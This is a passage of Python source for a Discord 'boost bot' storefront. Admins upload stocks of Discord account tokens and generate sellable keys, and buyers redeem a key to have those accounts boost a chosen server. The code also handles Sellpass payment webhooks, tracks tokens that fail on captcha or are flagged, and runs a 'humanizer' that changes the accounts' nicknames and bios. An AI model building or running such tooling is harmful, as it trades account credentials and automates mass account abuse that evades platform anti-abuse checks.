 name="restock", description="Add new nitro tokens to the boost bot!"
)
async def restock(
    ctx,
    type: int,
    file: discord.Attachment
    ):

    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) not in config["owners_ids"] and not any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        return await ctx.response.send_message(
            embed=discord.Embed(
                title=f"⚠️`WARNING` - **{bot.user}**",
                description="⚠️ - ```You are not allowed to be using this```",
                color=0xffa600,
            )
        )

    if type != 1 and type != 3 and type != 0:
        return await ctx.response.send_message(
            embed=discord.Embed(
                title=f"👎 `404 ERROR` - **{bot.user}**",
                description="👎 - ```Wrong input. values should be in 1-3```",
                color=0xff0000,
            )
        )

    if type not in [1, 3]:
        return await ctx.response.send_message(
            embed=discord.Embed(title="Error", description="Invalid type. Use 1 or 3.", color=0xff0000)
        )

    content = await file.read()
    new_lines = [t.strip() for t in content.decode(errors="ignore").replace("\r\n", "\n").split("\n") if t.strip()]
    db.add_tokens_db(str(type) + "m", new_lines)

    return await ctx.response.send_message(
        embed=discord.Embed(
            title=f"- `Restock`",
            description=f"`Restocked Tokens:` ",
            color=0xff00d9,
        )
    )
    
from discord.ext import commands, tasks
def get_ltc_price():
    url = "https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd"
    response = requests.get(url).json()
    return response["litecoin"]["usd"]

# Command to get and display the LTC price
@bot.tree.command(name="ltcprice")
async def ltcprice(interaction: discord.Interaction):
    embed = discord.Embed(
        title="**`Fetching New Price`**",
        color=0xff008c,
    )
    message = await interaction.response.send_message(embed=embed)
    message = await interaction.original_response()
    await update_ltc_price_message(message)

# Function to update the LTC price embed
async def update_ltc_price_message(message):
    while True:
        price = get_ltc_price()
        embed = discord.Embed(
            title="**`Litecoin Price`**",
            description=f"The current price of LTC is `${price}`",
            color=0xff008c,
        )
        embed.set_thumbnail(url="https://cryptologos.cc/logos/litecoin-ltc-logo.png")
        embed.set_footer(text="Refreshing In 60 Seconds")
        await message.edit(embed=embed)
        await asyncio.sleep(60)
class KeyCreationModal(Modal):
    def __init__(self):
        super().__init__(title="Create New Keys")

        # Define the input fields
        self.add_item(
            TextInput(
                label="Month",
                placeholder="Enter the month (1 or 3)",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Boosts Amount",
                placeholder="Enter the number of boosts (must be even)",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Quantity",
                placeholder="Enter the quantity (1-100)",
                required=True,
                style=discord.TextStyle.short
            )
        )

    async def on_submit(self, interaction: discord.Interaction):
        # Extract and process the input values
        month = int(self.children[0].value)
        boosts_amount = int(self.children[1].value)
        quantity = int(self.children[2].value)

        if month not in [1, 3]:
            return await interaction.response.send_message(
                embed=discord.Embed(
                    title="**❌ Invalid Month**",
                    description="The month should be either 1 or 3.",
                    color=0xff00bb,
                )
            )

        if boosts_amount % 2 != 0:
            return await interaction.response.send_message(
                embed=discord.Embed(
                    title="**❌ Invalid Boosts Amount**",
                    description="The number of boosts must be an even number.",
                    color=0xff00bb,
                )
            )

        if quantity > 100:
            return await interaction.response.send_message(
                embed=discord.Embed(
                    title="**❌ Quantity Limit Exceeded**",
                    description="The quantity cannot be greater than 100.",
                    color=0xff00bb,
                )
            )

        authsystem.generate_key([], month, boosts_amount, quantity, None)

        await interaction.response.send_message(
            embed=discord.Embed(
                title="- `Boost Bot`",
                description=f"Successfully created {quantity} keys for {boosts_amount}x {month} month server boosts! Use `/get_keys` to fetch/download them.",
                color=0xff00bb,
            )
        )

# Command to trigger the modal
@bot.tree.command(name='new_keys', description="Command to create key for key order system")
async def new_keys(ctx: discord.Interaction):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        # Open the modal
        modal = KeyCreationModal()
        await ctx.response.send_modal(modal)
    else:
        await ctx.response.send_message(
            embed=discord.Embed(
                title="- `Boost Bot`",
                description="❌ `You are not authorized to use this command`",
                color=0xff00bb,
            )
        )





class KeyRequestModal(Modal):
    def __init__(self):
        super().__init__(title="Request All Keys")

    async def on_submit(self, interaction: discord.Interaction):
        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            try:
                import io
                keys_data = json.dumps(db.load_keys(), indent=4).encode("utf-8")
                await interaction.user.send(file=discord.File(io.BytesIO(keys_data), "keys.txt"))
                await interaction.response.send_message("Please, check your DMs and make sure it's open.", ephemeral=True)
            except Exception as e:
                await interaction.response.send_message(f"Error: {e}")
        else:
            await interaction.response.send_message("You are not authorized to use this command.")

@bot.tree.command(name='get_all_keys', description="Command to get keys for key order system")
async def get_all_keys(ctx: discord.Interaction):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        # Open the modal
        modal = KeyRequestModal()
        await ctx.response.send_modal(modal)
    else:
        await ctx.response.send_message(
            embed=discord.Embed(
                title="- `Boost Bot`",
                description="❌ `You are not authorized to use this command`",
                color=0xff00bb,
            )
        )


class KeyFilterModal(Modal):
    def __init__(self):
        super().__init__(title="Get Keys")

        # Define the input fields
        self.add_item(
            TextInput(
                label="Month",
                placeholder="Enter the month (e.g., 1 or 3)",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Amount",
                placeholder="Enter the amount",
                required=True,
                style=discord.TextStyle.short
            )
        )

        self.add_item(
            TextInput(
                label="Quantity",
                placeholder="Enter the quantity (number of keys)",
                required=True,
                style=discord.TextStyle.short
            )
        )

    async def on_submit(self, interaction: discord.Interaction):
        month = int(self.children[0].value)
        amount = int(self.children[1].value)
        quantity = int(self.children[2].value)

        member = interaction.guild.get_member(interaction.user.id)
        if str(interaction.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
            try:
                import io
                all_keys = db.load_keys()
                filtered_keys = [key for key in all_keys if key['month'] == month and key['amount'] == amount]
                if len(filtered_keys) < quantity:
                    await interaction.response.send_message("Not enough keys found for the specified criteria.")
                    return

                keys_to_send = filtered_keys[:quantity]
                keys_str = '\n'.join(key['key'] for key in keys_to_send)
                await interaction.user.send(file=discord.File(io.BytesIO(keys_str.encode()), "filtered_keys.txt"))
                await interaction.response.send_message("Filtered keys sent to your DM.")
            except Exception as _e:
                await interaction.response.send_message(f"Error: {_e}")
        else:
            await interaction.response.send_message("You are not authorized to use this command.")

@bot.tree.command(name='get_keys', description="Command to get keys for key order system")
async def get_keys(ctx: discord.Interaction):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        # Open the modal
        modal = KeyFilterModal()
        await ctx.response.send_modal(modal)
    else:
        await ctx.response.send_message(
            embed=discord.Embed(
                title="- `Boost Bot`",
                description="❌ `You are not authorized to use this command`",
                color=0xff00bb,
            )
        )

@bot.tree.command(name='delete_keys', description="Command to delete keys from the system")
async def delete_keys(ctx, month: int, amount: int, quantity: int, delete_all_keys: bool = False):
  member = ctx.guild.get_member(ctx.user.id)

  if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
    try:
        if delete_all_keys:
            db.clear_all_keys()
        else:
            all_keys = db.load_keys()
            filtered_keys = [key for key in all_keys if key['month'] == month and key['amount'] == amount]
            if len(filtered_keys) < quantity:
                await ctx.response.send_message("Not enough keys found for the specified criteria.")
                return
            to_remove = filtered_keys[:quantity]
            for key in to_remove:
                db.delete_key_entry(key['key'])
        await ctx.response.send_message("Keys deleted successfully.")
    except Exception as e:
        await ctx.response.send_message(f"Error: {e}")
  else:
      await ctx.response.send_message("unauthorised")

import json

def mark_key_used(key, month, amount, guild_id, successful, failed, time_taken):
    db.mark_key_used_db(key, month, amount, guild_id, successful, failed, time_taken)

def fetch_from_key(key):
    return db.fetch_from_key_db(key)

def check_key_used(key):
    return db.is_key_used(key)

def update_key(key, new_amount):
    db.update_key_amount(key, new_amount)

@bot.tree.command(
    name="auto_boosting",
    description="Shows the auto_boosting bot panel."
)
async def auto_panel(ctx, channel: discord.TextChannel = None):
    embed = discord.Embed(
        title="`AutoBoosting`",
        description="`Options`"
    )
    embed.add_field(
        name="Avaliable Option: ",
        value="[ 1 ]  Automated Server Boosting With Key\n [ 2 ] View Your Key Information\n[ 3 ] View Stock \n[ 4 ] Guide About Auto Boosting \n ```Disclaimer``` \n */use_key can be another alternative way to use keys*",
        inline=False
    ).color = 0xff0090
    cv = ctx.channel
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        await ctx.response.send_message("Processing", ephemeral=True)
        if channel is None:
            await cv.send(embed=embed, view=AutoView())
        else:
            await channel.send(embed=embed, view=AutoView())
    else:
        await ctx.response.send_message("unauthorised", ephemeral=True)

class Check_Key_Modal(Modal):
    def __init__(self):
        super().__init__(title = "Boost")
        self.add_item(
            TextInput(
                label = "Key",
                placeholder = "Enter your key.",
                required = True,
                style = discord.TextStyle.short
            )
        )
    async def on_submit(self, ctx: discord.Interaction):   
        key = self.children[0].value
        try:
            key_info = db.get_key(key)
            if key_info:
                embed = discord.Embed(
                    title="**Boost Bot**",
                    description=f"Key: {key_info['key']}\nMonth: {key_info['month']}\nAmount: {key_info['amount']}",
                    color=0x2F3136,
                )
                await ctx.response.send_message(embed=embed, ephemeral=True)
            else:
                await ctx.response.send_message("Key not found.", ephemeral=True)
        except Exception as e:
            await ctx.response.send_message(f"Error: {e}", ephemeral=True)

class Auto_Boost_Modal(Modal):
    def __init__(self):
        super().__init__(title = "Boost")
        self.add_item(
            TextInput(
                label = "Key",
                placeholder = "Enter your key.",
                required = True,
                style = discord.TextStyle.short
            )
        )
        self.add_item(
            TextInput(
                label = "Guild ID",
                placeholder = "Discord Server Guild ID.",
                required = True,
                style = discord.TextStyle.short
            )
        )
        self.add_item(
            TextInput(
                label = "Custom Nickname (optional)",
                placeholder = "Leave blank to use default from config",
                required = False,
                style = discord.TextStyle.short
            )
        )
        self.add_item(
            TextInput(
                label = "Custom Bio (optional)",
                placeholder = "Leave blank to use default from config",
                required = False,
                style = discord.TextStyle.short
            )
        )

    async def on_submit(self, ctx: discord.Interaction):

        key = self.children[0].value
        guild_id = self.children[1].value.strip().replace("https://discord.com/channels/","").split("/")[0]
        custom_nick = self.children[2].value.strip() or None
        custom_bio  = self.children[3].value.strip() or None


        try:
            amount, months = fetch_from_key(key)
        except KeyError:
            await ctx.response.send_message(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Invalid key or key not found.",
                    color=0x2F3136,
                ), ephemeral=True
            )
        await ctx.response.defer()

        if amount % 2 != 0:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Number of boosts should be in even numbers.",
                    color=0x2F3136,
                ), ephemeral=True
            )

        if months != 1 and months != 3:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Invalid months [VALID INPUTS: 1/3].",
                    color=0x2F3136,
                ), ephemeral=True
            )

        if not check_guild_accessible(guild_id):
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description=f"❎ | Bot is not in guild {guild_id}. Add the bot to the server first.",
                    color=0x2F3136,
                ), ephemeral=True
            )

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        tokensStock = getStock(filename)
        requiredStock = int(amount / 2)

        if requiredStock > len(tokensStock):
            await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description=f"❎ | We don't have enough tokens in stock\nUse `/restock` command to restock.",
                    color=0x2F3136,
                ), ephemeral=True
            )
        boost = Booster()

        tokens = []

        for x in range(requiredStock):
            tokens.append(tokensStock[x])
            remove(tokensStock[x], filename)

        await ctx.followup.send(
            embed=discord.Embed(
                title="Boost Bot", description=f"Boosting....", color=0x2F3136
            ), ephemeral=True
        )

        start = time.time()
        status = boost.thread(guild_id, tokens)

        time_taken = round(time.time() - start, 2)
        new_len = len(status["failed"]) * 2 + len(status["captcha"]) * 2 
        if len(status['failed']) > 0 or len(status['captcha']):
            embed = discord.Embed(
        title="Failed Boosts",
        description=f"Due to some issues there was some issues in the tokens such as captcha/invalid/flagged. No of failed boosts  {len(status['failed'])*2}. But don't worry your key balance is not reduced for failed boosts. You can retry with the same key with the existing balance. Sorry for the inconvenience caused. If you still face any type of issue make sure to contact the server management! \n Update Key Information -> \n **Balance** - {new_len} Boosts \n", 
        color=0x2F3136
    )
            await ctx.followup.send(embed=embed, ephemeral=True)
            content = ""
            if webhook_url != "" and use_log == True:
                embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Failure Detected ->**\n ``` User-ID : {ctx.user.id} \n User-Mention : {ctx.user} \n Key - {key} \n Amount : {amount} \n Month : {months} \n Failed-Boosts : {len(status['failed']) * 2} \n  Captcha-Boosts : {len(status['captcha']) * 2} \n  ``` **Failed Boosts** ```{status['failed']}```  \n**Captcha** ```{status['captcha']}``` \n **Success** \n ``` {status['success']}```", color=0x2F3136)
                send_webhook_message(webhook_url, content, embed)
            update_key(key, new_len)
        else:   
            mark_key_used(key, months, amount, guild_id, len(status['success']), len(status['failed']), time_taken)

        await ctx.followup.send(
            embed=discord.Embed(
                title="**Boosts Data**",
                description=f"**Amount :**  {amount} boosts \n**Months :** {months}m \n**Guild ID :** {guild_id} \n**Tokens:** {requiredStock} \n**Success :** {len(status['success'])*2} \n**Failed :** {len(status['failed'])*2}\n \n  **Captcha-Boosts** : {len(status['captcha']) * 2} \n  **Time taken :** {time_taken}s",
                color=0x2F3136,
            ), ephemeral=True
        )
        content = ""
        if webhook_url != "" and use_log == True:
            embed = DiscordEmbed(title="**Boosting Data**", description=f"**__Amount__ ->**  {amount} boosts \n**__Months__ ->** {months}m \n**__Guild ID__ ->** {guild_id} \n**__Tokens__ ->** {requiredStock} \n**__Success__ ->** {len(status['success'])*2} \n**__Failed__ ->** {len(status['failed'])}\n**__Time taken__ ->** {time_taken}s \n ** Failed/Invalid ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}``` \n **Other Information** \n ``` User ID -> {ctx.user.id} \n User Mention - {ctx.user} \n Key - {key} ```", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)

        try:
            if config['auto_config']['Use_customization']:
                boost.humanizerthread(tokens=status['success'], custom_bio=custom_bio, custom_nick=custom_nick)
        except Exception as e:
            print(e)


# ── /redeempanel ──────────────────────────────────────────────────────────────

class RedeemKeyModal(Modal):
    def __init__(self):
        super().__init__(title="Redeem Boost Key")
        self.add_item(TextInput(
            label="Boost Key",
            placeholder="Enter your boost key (e.g. BOOST-XXXXX-XXXXX-XXXXX)",
            required=True,
            style=discord.TextStyle.short
        ))
        self.add_item(TextInput(
            label="Server Invite / Guild ID",
            placeholder="Paste your Discord invite link or server ID",
            required=True,
            style=discord.TextStyle.short
        ))
        self.add_item(TextInput(
            label="Custom Nickname (optional)",
            placeholder="Leave blank to use default from config",
            required=False,
            style=discord.TextStyle.short
        ))
        self.add_item(TextInput(
            label="Custom Bio (optional)",
            placeholder="Leave blank to use default from config",
            required=False,
            style=discord.TextStyle.short
        ))

    async def on_submit(self, ctx: discord.Interaction):
        key = self.children[0].value.strip()
        raw_guild = self.children[1].value.strip()
        guild_id = raw_guild.replace("https://discord.com/channels/", "").replace("https://discord.gg/", "").split("/")[0]
        custom_nick = self.children[2].value.strip() or None
        custom_bio  = self.children[3].value.strip() or None

        await ctx.response.defer(ephemeral=True)

        # Validate key
        try:
            amount, months = fetch_from_key(key)
        except KeyError:
            return await ctx.followup.send(embed=discord.Embed(
                title="❌ Invalid Key",
                description="That key was not found or has already been used.",
                color=0xef4444
            ), ephemeral=True)

        if amount % 2 != 0:
            return await ctx.followup.send(embed=discord.Embed(
                title="❌ Invalid Key",
                description="The boost amount on this key is invalid. Please contact support.",
                color=0xef4444
            ), ephemeral=True)

        if months not in [1, 3]:
            return await ctx.followup.send(embed=discord.Embed(
                title="❌ Invalid Key",
                description="The month value on this key is invalid (must be 1 or 3).",
                color=0xef4444
            ), ephemeral=True)

        # Check bot is in guild
        if not check_guild_accessible(guild_id):
            invite_url = get_bot_invite_url()
            invite_line = f"\n\n[➕ Click here to invite the bot]({invite_url})" if invite_url else ""
            return await ctx.followup.send(embed=discord.Embed(
                title="⚠️ Bot Not In Server",
                description=(
                    f"The bot hasn't been added to server `{guild_id}` yet.\n"
                    f"Please invite the bot first, then redeem your key.{invite_line}"
                ),
                color=0xeab308
            ), ephemeral=True)

        # Check stock
        filename = "data/1m.txt" if months == 1 else "data/3m.txt"
        tokens_stock = getStock(filename)
        required = int(amount / 2)

        if required > len(tokens_stock):
            return await ctx.followup.send(embed=discord.Embed(
                title="⚠️ Out of Stock",
                description=(
                    f"Not enough tokens in stock right now.\n"
                    f"**Required:** {required} tokens | **Available:** {len(tokens_stock)} tokens\n"
                    f"Please contact support to restock."
                ),
                color=0xeab308
            ), ephemeral=True)

        # Boosting in progress
        await ctx.followup.send(embed=discord.Embed(
            title="⚡ Boosting...",
            description=f"Processing **{amount} boosts** ({months}m) for your server. Please wait.",
            color=0x7c3aed
        ), ephemeral=True)

        tokens = []
        for x in range(required):
            tokens.append(tokens_stock[x])
            remove(tokens_stock[x], filename)

        start = time.time()
        boost = Booster()
        status = boost.thread(guild_id, tokens)
        time_taken = round(time.time() - start, 2)

        failed_count = len(status["failed"]) * 2
        captcha_count = len(status["captcha"]) * 2
        success_count = len(status["success"]) * 2
        new_len = failed_count + captcha_count

        if failed_count > 0 or captcha_count > 0:
            update_key(key, new_len)
            wh_log(
                "⚠️ Boost Partial Failure — /redeempanel",
                f"**User:** {ctx.user} (`{ctx.user.id}`)\n**Key:** `{key}`\n**Guild:** `{guild_id}`\n"
                f"**Success:** {success_count} | **Failed:** {failed_count} | **Captcha:** {captcha_count}\n"
                f"**Remaining balance:** {new_len} boosts",
                color=0xeab308
            )
            await ctx.followup.send(embed=discord.Embed(
                title="⚠️ Partial Success",
                description=(
                    f"Some boosts encountered issues (captcha / flagged tokens).\n\n"
                    f"✅ **Successful:** {success_count} boosts\n"
                    f"❌ **Failed:** {failed_count} boosts\n"
                    f"🔒 **Captcha:** {captcha_count} boosts\n\n"
                    f"Your key balance has **not** been deducted for failed boosts.\n"
                    f"**Remaining balance:** {new_len} boosts — retry with the same key."
                ),
                color=0xeab308
            ), ephemeral=True)
        else:
            mark_key_used(key, months, amount, guild_id, len(status["success"]), len(status["failed"]), time_taken)
            wh_log(
                "✅ Boost Complete — /redeempanel",
                f"**User:** {ctx.user} (`{ctx.user.id}`)\n**Key:** `{key}`\n**Guild:** `{guild_id}`\n"
                f"**Success:** {success_count} boosts | **Time:** {time_taken}s",
                color=0x22c55e
            )
            await ctx.followup.send(embed=discord.Embed(
                title="✅ Boosts Delivered!",
                description=(
                    f"**{success_count} boosts** have been successfully applied.\n\n"
                    f"🗓️ **Duration:** {months} month(s)\n"
                    f"⚡ **Tokens used:** {required}\n"
                    f"⏱️ **Time taken:** {time_taken}s\n\n"
                    f"Thank you for your purchase! 🎉"
                ),
                color=0x22c55e
            ), ephemeral=True)

        try:
            if config['auto_config']['Use_customization']:
                boost.humanizerthread(tokens=status['success'], custom_bio=custom_bio, custom_nick=custom_nick)
        except Exception:
            pass


class RedeemPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🔑 Redeem Key", style=discord.ButtonStyle.success, custom_id="redeempanel_redeem")
    async def redeem_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(RedeemKeyModal())

    @discord.ui.button(label="➕ Invite Bot", style=discord.ButtonStyle.blurple, custom_id="redeempanel_invite")
    async def invite_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        invite_url = get_bot_invite_url()
        if invite_url:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="➕ Invite the Bot",
                    description=(
                        f"[Click here to invite the bot to your server]({invite_url})\n\n"
                        f"Make sure to invite the bot **before** redeeming your key so "
                        f"it can join and boost your server."
                    ),
                    color=0x5865f2
                ), ephemeral=True
            )
        else:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Invite Unavailable",
                    description="Bot client ID is not configured. Please contact an admin.",
                    color=0xef4444
                ), ephemeral=True
            )


@bot.tree.command(name="redeempanel", description="Send the boost key redemption panel to this channel.")
async def redeempanel(ctx: discord.Interaction):
    # Tell the executor only that the panel was sent
    await ctx.response.send_message("Panel sent.", ephemeral=True)

    # Post the public panel in the channel for everyone to see
    embed = discord.Embed(
        title="⚡ Redeem Your Boost Key",
        description=(
            "Welcome! Use the buttons below to get started.\n\n"
            "**🔑 Redeem Key** — Enter your boost key and server ID to apply your boosts instantly.\n"
            "**➕ Invite Bot** — Make sure to invite the bot to your server **before** redeeming your key.\n\n"
            "> ⚠️ **Important:** The bot must already be in your server to deliver boosts. "
            "If you haven't added it yet, click **Invite Bot** first."
        ),
        color=0x7c3aed
    )
    embed.set_footer(text="Click a button below to get started.")
    await ctx.channel.send(embed=embed, view=RedeemPanelView())

# ── End /redeempanel ──────────────────────────────────────────────────────────


class StockModal(Modal):
    def __init__(self):
        super().__init__(title = "Normal Stocks")

        self.add_item(
            TextInput(
                label = "Duration",
                placeholder = "Months? [1/3]",
                required = True,
                style = discord.TextStyle.short
            )
        )

    async def on_submit(self, ctx: Interaction):

        duration = int(self.children[0].value)

        await ctx.response.defer(ephemeral=False)

        if duration != 1 and duration != 3 and duration != 0:
            return await ctx.followup.send(
                embed=discord.Embed(
                    title="**ERROR**",
                    description="❎ | Invalid type. [1/3] are valid inputs.",
                    color=0x2F3136,
                ), ephemeral=True
            )

        stock = db.count_tokens_db(str(duration) + "m")

        return await ctx.followup.send(
            embed=discord.Embed(
                title=f"```{duration}m Tokens Normal Stock```",
                description=f"\n *`{stock}` Nitro Tokens In Stock* \n *`{stock * 2}` Boosts Avaliable In Stock*",
                color=0xff008c,
            ), ephemeral=True
        )

@bot.tree.command(
 name="stock", description="Display the stock of boosts and tokens."
)
async def stock(
    ctx
): 
     member = ctx.guild.get_member(ctx.user.id)
     if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles): 
      await ctx.response.send_modal(StockModal())
     else:
         await ctx.response.send_message("unauthorised")


@bot.tree.command(name='get_key_information', description="Command to get information about a specific key")
async def get_key_information(ctx, key: str):
    try:
        key_info = db.get_key(key)
        if key_info:
            embed = discord.Embed(
                title="**Boost Bot**",
                description=f"Key: {key_info['key']}\nMonth: {key_info['month']}\nAmount: {key_info['amount']}",
                color=0x2F3136,
            )
            await ctx.response.send_message(embed=embed)
        else:
            await ctx.response.send_message("Key not found.")
    except Exception as e:
        await ctx.response.send_message(f"Error: {e}")
@bot.tree.command(name='key_stats', description="Command to show statistics about keys")
async def key_stats(ctx):
    try:
        all_keys = db.load_keys()

        one_month_keys = sum(1 for key in all_keys if key['month'] == 1)
        three_month_keys = sum(1 for key in all_keys if key['month'] == 3)

        amount_stats = {}
        amount_stats_with_months = {}

        for key in all_keys:
            amount = key['amount']
            if amount in amount_stats:
                amount_stats[amount] += 1
            else:
                amount_stats[amount] = 1

            if amount in amount_stats_with_months:
                amount_stats_with_months[amount]['total'] += 1
                if key['month'] == 1:
                    amount_stats_with_months[amount]['1m'] += 1
                elif key['month'] == 3:
                    amount_stats_with_months[amount]['3m'] += 1
            else:
                amount_stats_with_months[amount] = {'total': 1, '1m': 0, '3m': 0}
                if key['month'] == 1:
                    amount_stats_with_months[amount]['1m'] += 1
                elif key['month'] == 3:
                    amount_stats_with_months[amount]['3m'] += 1

        stats_message = f"1 Month Keys: {one_month_keys}\n3 Month Keys: {three_month_keys}\n\nAmount Statistics:\n"
        for amount, count in amount_stats.items():
            stats_message += f"{amount} amount keys: {count} (1m: {amount_stats_with_months[amount]['1m']}, 3m: {amount_stats_with_months[amount]['3m']})\n"
            embed=discord.Embed(
                    title="**Boost Bot**",
                    description=stats_message,
                    color=0x2F3136,
                )
        await ctx.response.send_message(embed=discord.Embed(
                    title="**Boost Bot**",
                    description=stats_message,
                    color=0x2F3136,
                ))
    except Exception as _e:
        await ctx.response.send_message(f"Error: {_e}")

@bot.tree.command(name='get_used_key_information', description="Command to get information about a specific used key")
async def get_used_key_information(ctx, key: str):
    try:
        all_keys = db.get_used_keys()
        key_info = next((k for k in all_keys if k['key'] == key), None)
        if key_info:
            embed=discord.Embed(
                    title="**Boost Bot**",
                    description=f"Key: {key_info['key']}\nMonth: {key_info['month']}\nAmount: {key_info['amount']} \n Successful: {key_info['successful']} \n Failed: {key_info['failed']} \n Time-Taken: {key_info['time_taken']}s \n Invite: {key_info['invite']}",
                    color=0x2F3136,
                )

            await ctx.response.send_message(embed=embed)
        else:
            await ctx.response.send_message("Key not found.")
    except Exception as _e:
        await ctx.response.send_message(f"Error: {_e}")
import discord

@bot.tree.command(name='get_key', description="Command to get keys for key order system")
async def get_key(ctx, month: int, amount: int):
  member = ctx.guild.get_member(ctx.user.id)
  if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
    try:
        all_keys = db.load_keys()
        filtered_keys = [key for key in all_keys if key['month'] == month and key['amount'] == amount]
        if not filtered_keys:
            await ctx.response.send_message("No keys found for the specified criteria.")
            return

        key_to_send = filtered_keys[0]  

        embed = discord.Embed(title="Filtered Key", color=0x2F3136)
        embed.add_field(name="Month", value=key_to_send['month'], inline=False)
        embed.add_field(name="Amount", value=key_to_send['amount'], inline=False)
        embed.add_field(name="Key", value=key_to_send['key'], inline=False)

        await ctx.response.send_message(embed=embed)
    except Exception as e:
        await ctx.response.send_message(f"Error: {e}")
  else:
      await ctx.response.send_message("Unauthorised")

@bot.tree.command(name='delete_key', description="Command to delete a specific key from the system")
async def delete_key(ctx, key_to_delete: str):
    member = ctx.guild.get_member(ctx.user.id)

    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        try:
            k = db.get_key(key_to_delete)
            if not k:
                await ctx.response.send_message("Key not found.")
                return
            db.delete_key_entry(key_to_delete)
            embed = discord.Embed(title="Key Deleted!", description=f"{key_to_delete} successfully deleted", color=0x2F3136)
            await ctx.response.send_message(embed=embed)
        except Exception as e:
            await ctx.response.send_message(f"Error: {e}")
    else:
        await ctx.response.send_message("Unauthorized")
@bot.tree.command(name='failed', description="Command to get failed tokens and send them to DMs")
async def get_failed_tokens(ctx):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):
        try:
            logs = db.get_boost_logs(status="failed")
            failed_tokens = "\n".join(l.get("token", "") for l in logs if l.get("token"))
            await ctx.user.send(failed_tokens or "No failed tokens.")

            embed = discord.Embed(
                title="Success",
                description="Failed tokens successfully sent to your DMs.",
                color=0x2F3136
            )
        except Exception as e:
            embed = discord.Embed(
                title="Error",
                description=f"An error occurred: {str(e)}",
                color=0xFF0000
            )
    else:
        embed = discord.Embed(
            title="Unauthorized",
            description="You are not authorized to use this command.",
            color=0xFF0000
        )

    await ctx.response.send_message(embed=embed)

@bot.tree.command(name='filecleaner', description="Command to clean token file content")
async def clean_token_file(ctx, file_name: str):
    member = ctx.guild.get_member(ctx.user.id)
    if str(ctx.user.id) in config["owners_ids"] or any(str(role.id) in config["admin_role_ids"] for role in member.roles):  
        try:
            if file_name == '1':
                db.clear_tokens_db("1m")
            elif file_name == '3':
                db.clear_tokens_db("3m")
            else:
                await ctx.response.send_message("Invalid file name. Please provide either '1' or '3'.", ephemeral=True)
                return

            await ctx.response.send_message("Token file cleaned successfully.", ephemeral=True)
        except Exception as e:
            await ctx.response.send_message(f"Error: {e}")
    else:
        await ctx.response.send_message("Unauthorized")
@bot.tree.command(name='use_key', description="Command to use a key for autoboosting")
async def get_used_key_information(ctx):
    await ctx.response.send_modal(Auto_Boost_Modal())

app = FastAPI()
if os.path.isdir("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")
_boost_jobs = {}

@app.post('/sellpass')
async def get_sellpass(data: dict):
    invoiceid = data['InvoiceId']
    shop_id = data['Product']['ShopId']
    api_key = config['sellpass']['api_key']
    header = {"Authorization": f"Bearer {api_key}"}
    r = httpx.get(f'https://dev.sellpass.io/self/{shop_id}/invoices/{invoiceid}', headers=header)
    if r.status_code < 250:

        r1 = r.json()
        custom_fields = r1['data']['partInvoices'][0]['customFields']
        for field in custom_fields:
            if field['customField']['name'] == config['sellpass']['custom_field_name']:
                invite = field['valueString']
                break

        title = r1['data']['partInvoices'][0]['product']['title']
        email = r1['data']['customerInfo']['customerForShop']['customer']['email']
        match = re.search(r'\d+', title)

        if match:
            amount = int(match.group())
            start_index = title.find('[') + 1
            end_index = title.find(']', start_index)
            months_str = title[start_index:end_index]
            months = int(''.join(filter(str.isdigit, months_str)))

        guild_id = invite.strip() if invite.strip() else ""
        if not guild_id or not check_guild_accessible(guild_id):
            content = ""
            embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Bot not in guild / Invalid Guild ID ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Guild ID: {guild_id}```", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)
            return f"Bot is not in guild {guild_id}. Add the bot first."

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

